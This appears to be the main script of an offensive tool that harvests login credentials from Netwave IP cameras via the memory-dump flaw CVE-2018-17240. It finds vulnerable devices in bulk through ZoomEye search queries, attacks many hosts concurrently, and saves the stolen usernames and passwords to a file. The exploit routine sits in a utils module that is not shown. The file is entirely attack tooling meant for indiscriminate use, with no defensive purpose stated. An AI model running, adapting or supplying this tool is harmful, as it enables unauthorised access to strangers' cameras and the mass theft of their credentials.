import argparse
import asyncio
import logging
import os

from rich import traceback
from rich.logging import RichHandler
from rich_argparse import RichHelpFormatter

from utils import Args, CoroutineExecutor, NetwaveDevice, ZoomEye, format_hosts

logger = logging.getLogger(__name__)
traceback.install(show_locals=True)


async def main() -> None:
    parser = argparse.ArgumentParser(
        description="A tool for retrieving login credentials from Netwave IP cameras "
        "using a memory dump vulnerability (CVE-2018-17240)",
        formatter_class=RichHelpFormatter,
    )

    source_group = parser.add_mutually_exclusive_group()

    source_group.add_argument(
        "--host",
        action="append",
        default=[],
        type=str,
        help="A host to check, can be specified multiple times",
        metavar="HOST",
        dest="hosts",
    )

    source_group.add_argument(
        "-f",
        "--file",
        default=None,
        type=str,
        help="A file containing the hosts to check",
    )

    source_group.add_argument(
        "-k",
        "--key",
        default=os.getenv("ZOOMEYE_API_KEY"),
        type=str,
        help="The ZoomEye API key to use, "
        "by default the ZOOMEYE_API_KEY environment variable",
    )

    parser.add_argument(
        "-o",
        "--output",
        default="credentials.txt",
        type=str,
        help="The file to write the credentials to, by default credentials.txt",
    )

    parser.add_argument(
        "-p",
        "--pages",
        default=20,
        type=int,
        help="The number of pages to search on ZoomEye, by default 20",
    )

    parser.add_argument(
        "-t",
        "--timeout",
        default=300,
        type=int,
        help="The timeout in seconds for retrieving the credentials from the memory "
        "dump, by default 300",
    )

    parser.add_argument(
        "-c",
        "--concurrent",
        default=20,
        type=int,
        help="The number of hosts to check concurrently, by default 20",
    )

    args = Args.from_args(parser.parse_args())

    logging.basicConfig(
        format="%(message)s",
        datefmt="%H:%M:%S",
        level=logging.INFO,
        handlers=[RichHandler(show_path=False)],
    )

    if args.hosts:
        hosts = format_hosts(args.hosts)
    elif args.file is not None:
        hosts = format_hosts(args.file.read_text().splitlines())
    elif args.key is not None:
        logger.info("Retrieving hosts from ZoomEye...")

        async with ZoomEye(args.key) as zoomeye:
            hosts = await zoomeye.get_hosts("Netwave", pages=args.pages)

    if not hosts:
        logger.error("Could not get any hosts from the specified source.")
        return

    hosts = list(set(hosts))

    logger.info(
        "Checking %s %s...", f"{len(hosts):,}", "host" if len(hosts) == 1 else "hosts"
    )

    devices = [NetwaveDevice(host, port) for host, port in hosts]

    async with CoroutineExecutor(args.concurrent) as executor:
        tasks = [
            executor.submit(device.get_credentials(timeout=args.timeout))
            for device in devices
        ]

        results = await asyncio.gather(*tasks)

    for device in devices:
        await device.close()

    args.output.touch()
    existing_credentials = args.output.read_text().splitlines()

    for credentials in results:
        if not credentials or str(credentials) in existing_credentials:
            continue

        existing_credentials.append(str(credentials))

    args.output.write_text("\n".join(existing_credentials))


if __name__ == "__main__":
    asyncio.run(main())
